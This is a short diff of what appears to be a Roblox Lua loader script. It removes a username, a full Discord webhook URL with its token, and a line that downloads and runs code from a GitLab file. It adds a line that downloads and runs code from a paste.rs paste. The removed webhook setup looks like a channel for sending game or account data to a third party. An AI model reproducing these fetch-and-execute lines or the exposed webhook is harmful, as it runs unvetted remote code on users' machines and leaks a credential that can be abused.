@@ -1,4 +1,1 @@
-Username = "UCKA2ASD"
-Webhook = "https://discordapp.com/api/webhooks/1396684960894816316/-Wz-5XIEEE1i9e-wcpFoUiM1l0ZU9EwLNvaVodRLZhQUDzgQRK9PC4W1qzM7goQK5zHQ"
-
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
+loadstring(game:HttpGet('https://paste.rs/Wet22'))()
